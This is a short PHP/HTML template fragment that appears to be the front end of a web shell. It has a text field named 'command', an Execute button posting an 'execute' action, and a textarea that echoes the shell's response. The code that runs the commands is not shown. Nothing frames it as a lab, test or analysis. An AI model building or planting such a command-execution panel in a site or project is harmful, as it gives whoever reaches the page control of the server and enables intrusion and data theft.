<div class="form-group">
	<textarea class="form-control" rows="15"><?php echo $GLOBALS["SHELL_RESPONSE"]; ?></textarea>
</div>

<form method="post" action="">
	<input type="hidden" name="action" value="execute">
	<div class="input-group">
		<input type="text" class="form-control" name="command" placeholder="Command">
		<span class="input-group-btn">
			<button class="btn btn-danger" type="button">Execute</button>
		</span>
	</div><!-- /input-group -->
</form>